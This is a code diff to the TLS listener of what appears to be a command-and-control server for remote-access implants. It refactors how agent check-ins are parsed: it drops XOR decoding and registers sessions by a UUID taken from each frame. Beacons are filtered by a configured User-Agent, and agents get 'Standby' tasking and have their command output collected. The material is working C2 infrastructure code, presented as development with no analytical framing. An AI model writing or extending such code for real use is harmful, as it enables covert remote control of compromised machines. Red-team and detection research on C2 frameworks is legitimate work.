@@ -6,7 +6,6 @@ typedef int TlsDummyType;
 #include "../include/Cipher.h"
 #include <stdio.h>
 #include <string.h>
-#include <time.h>
 
 #ifndef _WIN32
     #include <netinet/in.h>
@@ -30,61 +29,57 @@ SSL_CTX *TlsCreateCtx(const Config *C)
     }
 
     if (C->Mode == ModeMtls) {
-        SSL_CTX_set_verify(Ctx, SSL_VERIFY_PEER | SSL_VERIFY_FAIL_IF_NO_PEER_CERT, NULL);
+        SSL_CTX_set_verify(Ctx,
+            SSL_VERIFY_PEER | SSL_VERIFY_FAIL_IF_NO_PEER_CERT, NULL);
         if (!SSL_CTX_load_verify_locations(Ctx, C->CaFile, NULL)) {
             ERR_print_errors_fp(stderr); SSL_CTX_free(Ctx); return NULL;
         }
     }
-
     return Ctx;
 }
 
-static void TlsDispatch(SSL *Ssl, SessionPool *P, const char *PeerAddr, int SrcPort,
+static void TlsDispatch(SSL *Ssl, SessionPool *P, const char *PeerIp,
                         int IsHttp, const Config *C)
 {
     char Raw[BufSize] = {0};
     int N = SSL_read(Ssl, Raw, BufSize - 1);
     if (N <= 0) return;
-    Raw[N] = '\0';
 
-    char Payload[BufSize] = "Standby";
-    int PayloadLen = 7;
+    const char *FrameData = Raw;
+    int FrameLen = N;
 
     if (IsHttp) {
         char *Body = strstr(Raw, "\r\n\r\n");
-        if (Body) {
-            Body += 4;
-            int BLen = N - (int)(Body - Raw);
-            if (BLen > 0 && BLen < BufSize) {
-                memcpy(Payload, Body, (size_t)BLen);
-                Payload[BLen] = '\0';
-                ApplyXor(Payload, (size_t)BLen);
-                PayloadLen = BLen;
+        if (!Body) return;
 
-                const char *UaHdr = strstr(Raw, "User-Agent: ");
-                if (UaHdr) {
-                    char Ua[MaxUaLen] = {0};
-                    const char *UaEnd = strstr(UaHdr, "\r\n");
-                    int UaLen = UaEnd ? (int)(UaEnd - (UaHdr + 12)) : 0;
-                    if (UaLen > 0 && UaLen < MaxUaLen) {
-                        memcpy(Ua, UaHdr + 12, (size_t)UaLen);
-                        Ua[UaLen] = '\0';
-                    }
-                    if (strcmp(Ua, C->UserAgent) != 0) return;
-                }
+        const char *UaHdr = strstr(Raw, "User-Agent: ");
+        if (UaHdr) {
+            char Ua[MaxUaLen] = {0};
+            const char *UaEnd = strstr(UaHdr, "\r\n");
+            int UaLen = UaEnd ? (int)(UaEnd - (UaHdr + 12)) : 0;
+            if (UaLen > 0 && UaLen < MaxUaLen) {
+                memcpy(Ua, UaHdr + 12, (size_t)UaLen);
+                Ua[UaLen] = '\0';
             }
+            if (strcmp(Ua, C->UserAgent) != 0) return;
         }
-    } else {
-        ApplyXor(Raw, (size_t)N);
-        memcpy(Payload, Raw, (size_t)N);
-        PayloadLen = N;
+
+        Body += 4;
+        FrameLen = N - (int)(Body - Raw);
+        FrameData = Body;
     }
 
+    if (FrameLen <= 0) return;
+
+    char Uuid[UuidLen], Payload[BufSize];
+    int PayloadLen;
+    if (!FrameParse(FrameData, FrameLen, Uuid, Payload, &PayloadLen)) return;
+
     int PrevCount   = P->Count;
-    AgentSession *S = PoolRegister(P, PeerAddr, SrcPort);
+    AgentSession *S = PoolRegister(P, Uuid, PeerIp);
     if (!S) return;
-    int IsNew = (P->Count > PrevCount);
-    if (IsNew) PoolNotifyConnect(P, S);
+
+    if (P->Count > PrevCount) PoolNotifyConnect(P, S);
 
     if (strcmp(Payload, "Standby") != 0) {
         memset(S->LastOutput, 0, BufSize);
@@ -132,13 +127,11 @@ static void TlsAccept(NetSock Listener, SessionPool *P, const Config *C,
     SSL_set_fd(Ssl, (int)Conn);
 
     if (SSL_accept(Ssl) <= 0) {
-        fprintf(stderr, "[!] TLS handshake failed from %s — ", inet_ntoa(Peer.sin_addr));
+        fprintf(stderr, "[!] TLS handshake failed from %s — ",
+                inet_ntoa(Peer.sin_addr));
         ERR_print_errors_fp(stderr);
     } else {
-        char PeerAddr[AddrSize];
-        strncpy(PeerAddr, inet_ntoa(Peer.sin_addr), AddrSize - 1);
-        int SrcPort = (int)ntohs(Peer.sin_port);
-        TlsDispatch(Ssl, P, PeerAddr, SrcPort, IsHttp, C);
+        TlsDispatch(Ssl, P, inet_ntoa(Peer.sin_addr), IsHttp, C);
     }
 
     SSL_shutdown(Ssl);
